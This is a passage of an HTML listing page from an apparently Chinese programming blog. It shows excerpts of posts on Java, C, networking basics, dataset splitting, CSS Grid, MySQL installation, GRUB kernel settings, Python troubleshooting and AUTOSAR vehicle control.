		<a class="list__footer-readmore btn" href="/posts/a801c13cadc3760ced9f8476e9549ba4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e5495543349ed4a0bfd519eb508aa65/" rel="bookmark">
			Java猜数字游戏，简单易上手
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个小程序需要引入两个类。
import java.util.Random; import java.util.Scanner; Random是用来产生随机数的，Scanner是键盘输入。
具体代码如下：
public static void main(String[] args) { Scanner sc = new Scanner(System.in); Random r = new Random(); int b = r.nextInt(100); while (true) { System.out.println("请输入一个0到100之间数:"); int a = sc.nextInt(); if (a &gt; 100 || a &lt; 0) { System.out.println("请输入正确的数字"); } else if (a &gt; b) { System.out.println("你输入的数大了"); } else if (a &lt; b) { System.out.println("你输入的数小了"); } else if (a == b) { System.out.println("输入正确"); break; } } } 运行结果如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea60431eabd78b13a504766361db3e51/" rel="bookmark">
			数据结构项目实训——学生信息管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		模块划分及主要文件 1、主程序模块 主要功能：程序的入口
主要文件：main.c
2、菜单模块 主要功能：完成菜单的显示以及登录和调用相应功能函数
主要文件：menu.h menu.c
3、学生模块 主要功能：完成学生结构定义，添加学生，删除学生，修改学生，查找学生函数以及排序的实现。
主要文件：student.h student.c
4、底层链表 主要功能：主要完成链表的增、删、改、查、排序、遍历操作
主要文件：dlist.h dlist.c
各模块的主要函数 1、主程序模块-main.c int main(); //应用程序入口
2、菜单模块menu.h menu.c： #define LOOPCOUNT 3 错误次数
#define ADMINNAME "danny" 管理员用户名
#define ADMINPASS "admin" 管理员密码
#define STUFILE "student.dat" 学生数据文件
int login_menu(node_t *stulist); //程序主界面函数用于显示主程序界面 int administrator(node_t *stulist); //管理员界面 int display(node_t *stulist); //排序显示界面 int query(node_t *stulist); //查找界面 int modify(node_t *stulist); //修改学生信息 int delMenu(node_t *stulist); //删除学生信息 int student(node_t *stulist); //学生界面 3、学生模块主要函数student.h student.c void prnData(void *argv); node_t *loadstuInfo(); //加载信息 int savestuInfo(node_t *head); //保存至文件 node_t *stupwdcheck(node_t *head); //学生密码验证 int addstu(node_t *head); //添加学生函数 int delstu(node_t *head, const int id); //删除学生函数 // 函数参数：head为已有所有学生链表，mode为查找方式 //0 全部获取，1 按学号获取，2 按姓名获取，3 按班级获取 // 函数返回值：返回所查找到的新建的学生链表 // 函数流程： // 1、 如果mode为0，返回所有学生链表 // 2、 如果mode为1,按学号从链表中查找学生，返回单个学生 // 3、 如果mode为2,按姓名从链表中查找学生，新建链表，每查出一个学生则插入到新链表，返回新链表。 // 4、 如果mode为3,按班级从链表中查找学生，新建链表，每查出一个学生则插入到新链表，返回新链表。 node_t *getstu(node_t *head, int mode, stu_t stu); // 参数：getnode为学生节点指针,mode为获取模式， // 返回值：根据mode不同而返回不同结果 // 函数功能；按mode从学生节点中获取数据 // 函数流程： // 1、switch(mode) //1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea60431eabd78b13a504766361db3e51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73b44ef306e073000fa8bcab6e0908cd/" rel="bookmark">
			【网络原理之一】应用层协议、传输层协议UDP和TCP，TCP的三次握手和四次挥手以及TCP的可靠和效率机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		应用层协议XML协议JSONHTTP 传输层协议UDP协议UDP的特点UDP协议格式 TCP协议TCP的特点TCP协议格式TCP的安全和效率机制确认应答(可靠机制)超时重传(可靠机制)连接管理(可靠机制)三次握手(连接过程)四次挥手(断开的过程)状态的转化 滑动窗口(效率机制)流量控制(可靠机制)拥塞控制(可靠机制)延迟应答(效率机制)捎带应答(效率机制)面向字节流TCP异常情况的处理 应用层协议 在实现的TCP服务器和客户端中，发送双方确定的应用层协议就是以换行符作为每条消息的结尾。也就是说在发送时按照换行符进行编码，接收时按换行符进行解码。在开发应用程序时，一个大的工作就是进行协议的确定。常见的应用层协议有HTTP，FTP…
XML协议 主要是一种组织数据的格式。在XML文件中，每一个标签都是成对出现的，闭合标签带一个/。如果一个标签中含有子标签，那么这个标签就可以表示一个对象。如果一个标签包含多个相同的子标签，那么这个标签就表示集合。
缺点：结构复杂、不美观、冗余字符太多，在网络中传输比较耗费带宽。
JSON 1.用{}表示一个对象；
2.用[]表示一个集合；
3.属性用”key“：”value“。如果value是整型可以不加引号；
4.多个属性用逗号隔开，最后一个属性不加逗号。
JSON格式的优点是可读性好、美观、扩展性强，缺点是引入了额外的字符，占用带宽较大。
HTTP HTTP协议将在后面的学习中重点介绍。
传输层协议 核心的协议
UDP:无连接，不可靠传输， 面向数据报，全双工,大小受限。
TCP:有连接，可靠传输，面向字节流，全双工，大小不限。
UDP协议 UDP的特点 1.无连接：UDP传输的过程类似于发短信。知道对端的IP和端口号就直接进行传输，不需要建立连接。
2.不可靠传输：没有任何安全机制，发送端发送数据报以后，如果因为网络故障该段无法发到对方，UDP协议层也不会给应用层返回任何错误信息。
3.面向数据报：应用层交给UDP的多长的报文，UDP原样发送，既不会拆分也不会合并。
用UDP传输100个字节的数据：如果发送端一次发送100个字节，那么接收端也必须一次接收100个字节；而不能循环接收10次，每次接收10个字节。
4.缓冲区
• UDP只有接收缓冲区，没有发送缓冲区；
• UDP没有真正意义上的 发送缓冲区。发的数据会直接交给内核由内核将数据传给网络层协议进行后续的传输动作;
• UDP具有接收缓冲区，但是这个接收缓冲区不能保证收到的UDP报的顺序和发送UDP报的顺序一致;如果缓冲区满了，再到达的UDP数据就会被丢弃。
• UDP的socket既能读，也能写，这个概念叫做全双工。
5.大小受限:
UDP协议首部中有一个16位的最大长度。也就是说一个UDP能传输的数据最大长度是64K (包含UDP首部)。
UDP协议格式 UDP是传输层协议，传输层协议是通过操作系统负责实现的，操作系统管理着进程，每个进程开放一个端口号。16位最大可以表示65535， 说明端口号的范围就是0~65535。16位UDP长度也就是65535个byte，约等于64KB。UDP里的校验和是一个CRC冗余校验。即就是通过对数据(byte数组)中的每个byte累加得到的值。在解析UDP报文时，先16位表示源端口，再截16位标识目的端口号…。最终截取到数据长度是由UDP的长度决定的。
byte累加示例：
public class Demo_CRC { public static void main(String[] args) throws UnsupportedEncodingException { // 定义两个字符串 // String str = "你好世界"; String str = "你好啊，一会去吃火锅吧！！！"; String abc = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73b44ef306e073000fa8bcab6e0908cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c66daa52a95c1a32b9bb9c098260b30/" rel="bookmark">
			将图片以及图片的标签划分为训练集，验证集，测试集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		划分后的路径如下（YOLO格式）：
-------**/DataSet
| |-----train
|-----images-----|-----val
| |-----test
|
| |-----train
|-----labels-----|-----val
|-----test
一，导入所需库
import splitfolders import os import shutil # 文件移动所需的库 二，设置路径
图片所在原始路径，切分后训练集，验证集，测试集三个文件夹所在路径。此处根据所需改动
标签所在原路径，测试集路径，验证集路径
input_path = "D:\\Pycharm\\pythonProject1\\SOTP\\images" ##原始数据集所在文件夹路径，使用时必须要修改 file_name = "train" #原始数据集所在文件夹名 filepath = input_path + '\\' + file_name ##原始数据集路径，使用时必须要修改 output_path = "D:\\Pycharm\\pythonProject1\\SOTP\\images" ##划分后的训练集，验证集，测试集输出路径 label_path = "D:\\Pycharm\\pythonProject1\\SOTP\\labels\\train" ##标签文件所在文件夹 vallabel_patn = "D:\\Pycharm\\pythonProject1\\SOTP\\labels\\val" #验证标签所在文件夹 testlabel_path = "D:\\Pycharm\\pythonProject1\\SOTP\\labels\\test" #测试标签所在文件夹 三，将原始数据集文件按ratio中的比例切分train：val：test
输入为数据集图片文件夹所在的文件夹input_path
splitfolders.ratio(input=input_path, output=output_path, seed=1234, ratio=(0.6, 0.2, 0.2)) ##切分按ratio比例 此时切分后图片训练集，验证集，测试集所在位置如下
**/SOTP
| |-----train-----train(原来图片所在文件夹名称)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c66daa52a95c1a32b9bb9c098260b30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/448ed1b0482ba369dec908e9433b3289/" rel="bookmark">
			掌握CSS Grid布局：创建响应式网格系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在现代的Web开发中，响应式网格布局是一种非常重要的技术。CSS Grid布局为我们提供了一种强大且灵活的方式来创建网格系统，使我们能够轻松实现自适应和响应式的界面设计。
CSS Grid布局是一个二维网格系统，它允许我们将页面划分为行和列，并在这些行和列上放置元素。使用CSS Grid，我们可以以一种直观的方式定义网格的结构，而不需要依赖传统的浮动和定位技术。
以下是一个简单的示例，展示了如何使用CSS Grid布局创建一个响应式的网格系统：
在上面的示例中，我们首先创建了一个名为.grid-container的CSS类，用于承载整个网格系统。通过设置display: grid，我们告诉浏览器将其作为网格容器进行布局。
grid-template-columns: repeat(auto-fit, minmax(200px, 1fr))定义了列的宽度。这里使用了自动填充(auto-fit)和最小最大值(minmax)的组合来创建响应式的列。每列最小宽度为200px，但能自动调整以适应网格容器的大小，并平均分配空间(1fr)。
grid-gap: 20px设置了网格项之间的间距。
接下来，我们定义了一个.grid-item的CSS类，用于设置网格中的每个项的样式。在这个示例中，我们简单地设置了背景色和内边距。
最后，通过媒体查询(@media)，我们在小于或等于768px的屏幕宽度下，重新定义了列的宽度，以适应较小的屏幕。
通过上述的CSS代码，我们可以轻松地创建出一个自适应和响应式的网格系统。无论页面在大屏幕还是小屏幕上展示，网格项的布局都会自动适应调整。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dec93829c600e9e98358ea8aa69af67f/" rel="bookmark">
			java http大文件断点续传上传思路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上周遇到这样一个问题，客户上传高清视频（1G以上）的时候上传失败。 一开始以为是session过期或者文件大小受系统限制，导致的错误。 查看了系统的配置文件没有看到文件大小限制， web.xml中seesiontimeout是30，我把它改成了120。 但还是不行，有时候10分钟就崩了。 同事说，可能是客户这里服务器网络波动导致网络连接断开，我觉得有点道理。 但是我在本地测试的时候发觉上传也失败，网络原因排除。 看了日志，错误为： java.lang.OutOfMemoryError Java heap space 上传文件代码如下： public static String uploadSingleFile(String path,MultipartFile file) { if (!file.isEmpty()) { byte[] bytes; try { bytes = file.getBytes(); // Create the file on server File serverFile = createServerFile(path,file.getOriginalFilename()); BufferedOutputStream stream = new BufferedOutputStream( new FileOutputStream(serverFile)); stream.write(bytes); stream.flush(); stream.close(); logger.info("Server File Location=" + serverFile.getAbsolutePath()); return getRelativePathFromUploadDir(serverFile).replaceAll("\\\\", "/"); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dec93829c600e9e98358ea8aa69af67f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb195c7c9b94396bdc5f6cfab8ce14ee/" rel="bookmark">
			java http大文件断点续传上传方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一点：Java代码实现文件上传
FormFile file = manform.getFile();
String newfileName = null;
String newpathname = null;
String fileAddre = "/numUp";
try
{
InputStream stream = file.getInputStream();// 把文件读入
String filePath = request.getRealPath(fileAddre);//取系统当前路径
File file1 = new File(filePath);//添加了自动创建目录的功能
((File)file1).mkdir();
newfileName = System.currentTimeMillis()
+ file.getFileName().substring(
file.getFileName().lastIndexOf('.'));
ByteArrayOutputStream baos = new ByteArrayOutputStream();
OutputStream bos = new FileOutputStream(filePath + "/"
+ newfileName);
newpathname = filePath + "/" + newfileName;
System.out.println(newpathname);
// 建立一个上传文件的输出流
System.out.println(filePath + "/" + file.getFileName());
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb195c7c9b94396bdc5f6cfab8ce14ee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/640d5640ded20f443f87860f15cd2e1f/" rel="bookmark">
			JAVA 防止重复提交 防止用户重复提交数据拦截器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通过拦截器拦截需要防重复添加的url接口，通过 历史的key:value，获取历史key的value值与当前valueNew检验，相同，提示重复提交 key ：用户（或者token）+url（请求接口）
value：请求的内容(params + data)数据
@SameUrlData 的 value 默认 3秒内不允许重复提交相同数据
可以自定义
1、自定义注解 SameUrlData
自定义注解防止表单重复提交 package org.springblade.common.sameUrlData; import java.lang.annotation.*; /** * * 自定义注解防止表单重复提交 */ @Inherited @Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface SameUrlData { /** * 默认 3 秒不允许 重复新增 * @return */ long value() default 3L; } 2、注册拦截器 WebMvcConfigExt =》WebMvcConfigurer
package org.springblade.common.sameUrlData; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; import java.util.ArrayList; import java.util.List; /** * * 注册拦截器 */ @Configuration public class WebMvcConfigExt implements WebMvcConfigurer { /** * 防止重复提交拦截器 */ @Autowired private SameUrlDataInterceptor sameUrlDataInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) { // 避开静态资源 List&lt;String&gt; resourcePaths = defineResourcePaths(); registry.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/640d5640ded20f443f87860f15cd2e1f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65e5a7bdca3f0bc109cd45d44211baf4/" rel="bookmark">
			记录第一次组装电脑遇到的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		京东装机大师配置清单如下：
主板cpu安装
本次安装拆了两次主板 原因1.主板侧面有个金属板需要从内部安装
2.cpu风扇有个板需要装在主板底下
显卡比较大个要最后装，要不然可能要拆好几次
装系统时候 u盘启动认不出来，他妈的是因为机箱上的usb口跳线没接上，插到主板上的usb口就认出来了
最后硬盘温度高 主板本身有个盖面也是散热的 买硬盘有赠送一个散热片贴到硬盘底下去，这样前后都散热 鲁大师测试后 ，硬盘温度有67度，是因为主板上的盖板有个处女膜没撕掉，撕掉后硬盘温度能少10度，硬盘温度还是有57来度 怀疑硬盘的品牌最好买个华硕或者三星的牌子 ，我这个国产的
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bc348ce4af37d37ec07ea81f8099086/" rel="bookmark">
			基于 Linux 的 CentOS 7 安装 MySQL 8，包含以下步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于 Linux 的 CentOS 7 安装 MySQL 8，包含以下步骤
安装工作：卸载 MariaDB，下载资源包，检查旧版本 MySQL，解压安装。配置工作：基本设置，创建用户组和用户，数据目录。初始化 MySQL：配置文件，初始化。启动 MySQL：启动服务，登录，修改密码，创建远程连接用户，退出和关闭。 1、安装工作 1.1、卸载 MariaDB（❗） 1.1.1、MariaDB MySQL 的一个分支，主要由开源社区维护。
CentOS 7+ 不再默认使用 MySQL 数据库，而是 MariaDB 数据库。直接安装 MySQL 会与 MariaDB 的文件冲突。 👉 安装 MySQL 之前，先卸载自带的 MariaDB。
1.1.2、卸载 步骤
查看版本：有则需要卸载。
rpm -qa|grep mariadb 卸载：复制文件名，执行以下指令。
rpm -e --nodeps 文件名 确认卸载：
rpm -qa|grep mariadb 图示
1.2、下载资源包 Hint：将 MySQL 资源包放在 /usr/local/ 下
2 种下载方式：
1.2.1、官网下载 官网下载：Linux - Generic (glibc 2.12) (x86, 64-bit)
上传到服务器：/usr/local/ 目录下。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4bc348ce4af37d37ec07ea81f8099086/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7775bb634238b51fc84e3ac47f9c304/" rel="bookmark">
			Ubuntu22.04启动内核设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查看grub版本 grub-install --version
查看正在使用的内核 uname -r
查看内核启动顺序 使用命令grep menuentry /boot/grub/grub.cfg查看内核的启动顺序。
或者：
查看内核启动顺序
cat /boot/grub/grub.cfg |grep menuentry
修改方式 方式一：
假设要以Ubuntu, with Linux 5.15.0-76-generic内核版本启动，则将文件/etc/default/grub中
GRUB_DEFAULT=0
改为
GRUB_DEFAULT=1
然后使用命令更新GRUB配置文件
sudo update-grub
方式二：
假设你要以 Ubuntu, with Linux 5.15.0-76-generic内核版本启动，则将文件/etc/default/grub中
GRUB_DEFAULT=0
或者改为
GRUB_DEFAULT="Ubuntu, with Linux 5.15.0-76-generic"
然后使用命令更新GRUB配置文件
sudo update-grub
重点关注Warning行的内容，因为当前的GRUB版本是2.0后的，按照其提示的名字再次修改GRUB
GRUB_DEFAULT="gnulinux-advanced-b6338ffd-3287-4875-809d-d750e70a9988&gt;gnulinux-5.15.0-76-generic-advanced-b6338ffd-3287-4875-809d-d750e70a9988"
查看内核 重新reboot启动后输入 uname -r 查看，内核即为想要的内核。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e102e6439d85f0dda2525bc73d9ce29/" rel="bookmark">
			Python3，66行代码，搞了个音乐下载器，从此听歌再也不需要花费银子了，真香！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		66行代码敲出音乐下载器 1、引言2、代码实战2.1 思路2.2 安装2.3 示例 3、 总结 1、引言 小屌丝：鱼哥，最近比较流行的那首歌， 咋又说费了。
小鱼：那你就冲个VIP呗。
小屌丝：开玩笑， 我的钱又不是大风刮过来的。
小鱼：那你咋的，还想白嫖？
小屌丝：(⊙o⊙)… 果然鱼哥了解我。
小鱼：…不行的，不行的， 咱要支持正版版权的。
小屌丝：我也没说不支持版权啊。
小鱼：那你还想白嫖？
小屌丝：我就想着，换一种方式，支持版权。
小鱼：我去，别骗我。
小屌丝：真的，我想鱼哥你能想到。
小鱼：我…想不到。
小屌丝：别闹。 还有你想不到的， 你当我是小孩子啊。
小鱼：嘿嘿。
小屌丝：鱼哥，那赶紧的告诉我，咋搞嘞。
小鱼：我只告诉你一个人， 你不能外传哦。
小屌丝：必须的。
2、代码实战 2.1 思路 因为要 生成播放器， 且需要自动播放下载的音乐。 所以：
首先：电脑磁盘需要有足够的空间；其次：需要安装一些第三方库，第三：GUI实现下载音乐到指定文件夹下。第四：喝着黑桃A，听着下载的歌。 2.2 安装 这里需要第三方库，如下：
requestsPySimpleGUIretrying 这里，我看可以逐个安装，也可以批量安装，
我只展示PySimpleGUI库的安装，
pip install PySimpleGUI 其余安装方式，可以参照这两篇：
《Python3，选择Python自动安装第三方库，从此跟pip说拜拜！！》《Python3：我低调的只用一行代码，就导入Python所有库！》 安装完成，就可以进行代码编写了。
2.3 示例 # -*- coding:utf-8 -*- # @Time : 2023-07-06 # @Author : Carl_DJ ''' 实现功能： 实现GUI 音乐下载器。 ''' import os import tkinter as tk import webbrowser import requests import tkinter.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e102e6439d85f0dda2525bc73d9ce29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/125d8f110d8bf7e7f52cc7fd6c420e48/" rel="bookmark">
			【树莓派】解密树莓派Python项目中神秘的导入错误(`ModuleNotFoundError : No module named ‘Motor‘)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 问题导入python文件目录分析解决方案 问题导入 小编在使用树莓派编写python项目时出现了以下两种错误：
ModuleNotFoundError : No module named 'Motor' from ..hardware.motor import Motor portError: attempted relative import with no known parent package
这小编就非常好奇了，因为项目首先是在windows下的Pycharm编写完成，但是放入树莓派的命令行中运行时就出现这两种错误（windows与树莓派的python版本一致），一时间让小编不知所措。😂😂😂
python文件目录分析 树莓派可以使用文件夹来对项目中的.py文件进行分类，这样可以更好地组织和管理代码。一般来说，我们可以在项目根目录下创建一个名为"src"的文件夹，并将项目中的所有.py文件放入其中。这个文件夹可以进一步划分为子文件夹，每个子文件夹代表一个模块或一个功能。例如，一个树莓派的项目可能包括一个名为"sensor"的子文件夹，里面放置与传感器相关的.py文件。同时我们可以在文件夹中添加一个__init__.py文件来表示这是一个Python模块。
例如：
project/ ├── src/ │ ├── __init__.py │ ├── main.py │ ├── sensor/ │ │ ├── __init__.py │ │ ├── sensor_1.py │ │ ├── sensor_2.py │ ├── data_processing/ │ │ ├── __init__.py │ │ ├── data_processing_1.py │ │ ├── data_processing_2.py 在这个例子中，我们在项目根目录下创建了一个名为"src"的文件夹，里面包括了一个main.py文件和两个子文件夹sensor和data_processing。sensor文件夹中包含了用于传感器操作的两个.py文件，data_processing文件夹中包含了用于数据处理的两个.py文件。在每个文件夹中，我们可以使用__init__.py文件来说明这是一个Python模块。这样，我们就可以在main.py中使用import来导入这些模块和模块中的函数了。
解决方案 项目目录展示
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/125d8f110d8bf7e7f52cc7fd6c420e48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51c1ab439fea478ab6fb90b0716b7a54/" rel="bookmark">
			【解决】Pyinstaller打包报错IndexError: tuple index out of range
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 这个问题主要是在Python3.7以上的版本中遇到，用pyinstaller打包的时候发现报错
/usr/local/lib/python3.10/dis.py argval = const_list[const_index], IndexError: tuple index out of range 解决方案 vim 进入报错的文件，/usr/local/lib/python3.10/dis.py
找到def _unpack_opargs(code)函数，在else语句中添加extended_arg=0，如下：
退出文件，保存即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ae2534eeee1f1c6708f4a1117b11a46/" rel="bookmark">
			【AUTOSAR】VCU开发实际项目讲解（二十一）----VCU EPS控制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		EPS控制 系统功能概述 由VCM控制EPS，为整车提供转向助力。主要包含以下内容：
EPS的开启
EPS的关闭
原理框图信号列表 信号描述
CAN ID
位
（bit）
类型
备注
VCM_PEPS/BCMulEngineSpeed
Tx
系统功能详述 EPS的开启 当同时满足以下条件下，EPS开启：
整车处于行车Ready状态（具体过程参考驱动控制流程）。
通过VCM_PEPS/BCMulEngineSpeed报文，发送固定转速700rpm至EPS，开启EPS。
EPS的关闭 当满足以下任意条件时，EPS关闭：
整车处于非行车Ready状态且车速为0km/hIGN off状态且车速为0Km/h 通过VCM_PEPS/BCMulEngineSpeed报文，发送固定转速0rpm至EPS，关闭EPS。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1873ba249e43fe7eb727f88aeeae35c1/" rel="bookmark">
			【如何维护一个学习交流群】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 制定群组规范和目标
确定群组的主题和目标
主题： 正能量，互帮互勉，共同进步 目标： 让每一个群友可以成长为一个可以独挡一面的工程师 制定一份明确的行为准则，促进积极、友好和有意义的讨论
正常聊天式，无特定规范 鼓励成员尊重彼此，遵守规范
群主和群友职责所在，更多的要求大家自觉 招募和筛选成员：
定期宣传群组，吸引对嵌入式学习感兴趣的个人。
网络渠道 在加入群组前，要求潜在成员提供相关背景信息或参与筛选过程，以确保他们对主题有基本了解，并能为群组做出贡献。
目前无背景限制 促进有意义的讨论：
定期发布话题或问题，激发成员参与讨论。
投票讨论 鼓励成员分享自己的经验、见解和资源。
不定期腾讯会议 提供指导和支持，确保讨论保持专业、有价值和受欢迎。
需要大家共同进步 管理群组互动：
监控群组的互动并确保遵守规范
群主 鼓励成员互相尊重和帮助，解答问题、提供建议或分享资源
群主 解决争议和纠纷，维护积极的群组氛围
群主 提供资源和学习机会：
分享相关的学习资源、教程、论文和活动信息
和群友讨论后进行分享 定期组织在线研讨会、讲座或嘉宾演讲，提供学习机会
腾讯会议 鼓励成员分享自己的学习成果，激励互相学习和成长
日常，提倡包容，开放的人生态度 保持活跃和成长：
定期与群组成员沟通，了解他们的反馈和需求
目前做不到 提供定期更新和激励，保持群组的活跃度
目前做不到 鼓励成员推荐新的话题、活动或改进措施，以不断发展和改善群组
可以做到 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2beed9ea048c0158d230c3d18152481/" rel="bookmark">
			【计算机网络】第 1 课 - 数据的三种交换方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		欢迎来到博主 Apeiron 的博客，祝您旅程愉快 ！ 时止则止，时行则行。动静不失其时，其道光明。
目录
1、缘起
2、电路交换
3、分组交换
4、三种交换方式的对比
4.1、电路交换优点
4.2、电路交换缺点
4.3、报文交换优点 4.4、报文交换缺点
4.5、分组交换优点
4.6、分组交换缺点
5、总结 1、缘起 数据的交换就是数据从一个设备到另外一个设备，或者是从一个地方到另外一个地方。不同的实际需求情况，有不同的数据交换方式，常用的交换方式有 电路交换（Circuit Switching）、分组交换（Packet Switching）和 报文交换（Message Switching）。
2、电路交换 电话交换机接通电话线的方式称为电路交换
从通信资源的分配角度来看，交换（Switching）就是按照某种方式动态地分配传输线路的资源 电路交换的三个步骤： ① 建立连接（分配通信资源）
在使用电路交换打电话之前，必须先拨号请求建立连接。当被叫用户听到电话交换机送来的 拨号音 并摘机后，从主叫端到被叫端就建立了一条连接，也就是一条专用的物理通路。这条连接保证了双方通话时所需的通信资源，而这些资源在双方通信时不会被其他用户占用。
② 通话（一直占用通信资源）
在整个通话期间，第一步建立连接所分配的通信资源始终被占用。
③ 释放连接（归还通信资源）
通话完毕挂机后，电话交换机释放刚才使用的这条专用的物理通路。 如果使用电路交换来传送计算机数据，是否可行？
尽管采用电路交换可以实现计算机之间的数据传送，但是，线路的传输效率往往很低，这是因为计算机数据是 突发式地出现在传输线路上的。 试想一下这种情况，当用户正在输入和编辑一份待传输的文件时，用户所占用的通信资源暂时未被利用，该通信资源也不能被其他用户利用，宝贵的通信线路资源就白白被浪费了。因此，计算机网络通常采用分组交换，而不是电路交换。
3、分组交换 在因特网中，最重要的分组交换机就是路由器。它负责将各种网络互连起来，并对接收到的分组进行转发，也就是进行 分组交换 。
假如主机 H6 的用户要给主机 H2 的用户发送一条消息，通常我们把表示该消息的整块数据称为一个 报文。在发送报文之前，先把较长的报文划分成为一个个更小的等长数据段。在每一个数据段前面，加上一些由必要的控制信息组成的首部后，就构成了一个分组，也可简称为“包”，相应地，首部也可称为“包头”。
分组交换机收到一个分组后，先将分组暂时存储下来，再检查其首部，按照首部中的目的地址进行 查表转发，找到合适的转发接口，通过该接口将分组转发给下一个分组交换机。 与分组交换类似，报文交换中的交换结点也采用存储转发方式，但报文交换对报文的大小没有限制，这就要求交换结点需要有较大的缓存空间。需要注意的是，报文交换主要用于早期的电报通信网，现在较少使用，通常被较先进的分组交换方式所取代。因此，我们不再详细介绍报文交换了。 4、三种交换方式的对比 4.1、电路交换优点 ① 通信时延小
这是因为通信线路为通信双方用户专用，数据直达，因此通信时延非常小。当连续传输大量数据时，这一优点非常明显。
② 有序传输
这是因为通信双方之间只有一条专用的通信线路，数据只在这一条线路上传输，因此不存在失序问题。
③ 没有冲突
不同的通信双方拥有不同的信道，不会出现争用物理信道的问题。
④ 适用范围广
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a2beed9ea048c0158d230c3d18152481/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/075d8c209742ea129d130f69cbb31060/" rel="bookmark">
			数据预处理之数据规约
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、前言
二、PCA的主要参数：
三、数据归约任务1
四、数据规约任务2
一、前言 PCA(Principal Component Analysis)，即主成分分析方法，是一种使用最广泛的数据降维算法。PCA的主要思想是将n维特征映射到k维上，这k维是全新的正交特征也被称为主成分，是在原有n维特征的基础上重新构造出来的k维特征。
本质上，通过计算数据矩阵的协方差矩阵，然后得到协方差矩阵的特征值特征向量，选择特征值最大(即方差最大)的k个特征所对应的特征向量组成的矩阵。这样就可以将数据矩阵转换到新的空间当中，实现数据特征的降维。 ——来自《知乎》
二、PCA的主要参数： 1）n_components：这个参数指定了希望PCA降维后的特征维度数目。
最常用的做法是直接指定降维到的维度数目，此时n_components是一个大于等于1的整数。
当然，我们也可以指定主成分的方差和所占的最小比例阈值，让PCA类自己去根据样本特征方差来决定降维到的维度数，此时n_components是一个(0,1]之间的浮点数。
2）explained_variance_ratio_，它代表降维后的各主成分的方差值占总方差值的比例，这个比例越大，则越是重要的主成分。
